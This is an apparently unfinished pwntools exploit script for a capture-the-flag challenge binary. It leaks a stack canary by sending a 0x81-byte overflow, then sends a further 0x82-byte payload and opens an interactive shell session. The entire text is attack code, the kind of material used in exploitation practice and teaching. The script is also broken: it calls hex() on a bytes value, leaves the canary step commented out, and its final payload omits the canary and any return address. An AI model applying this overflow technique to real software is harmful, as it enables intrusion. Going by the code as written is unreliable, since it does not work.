from pwn import *

puts_got = 0x601018
puts_plt = 0x400620

gets_got = 0x601048
gets_plt = 0x400680


p = process("./ctf")

canary_pay = b""
canary_pay += b"A" * 0x81

p.sendafter(">> ",canary_pay)
p.recvuntil("A" * 0x80)

leak = p.recv(8)[1:]
print(hex(leak))
# canary = u64(b"\x00" + leak)

# print(hex(canary))

pay = b""
pay += b"A"*0x82

p.send(pay)

p.interactive()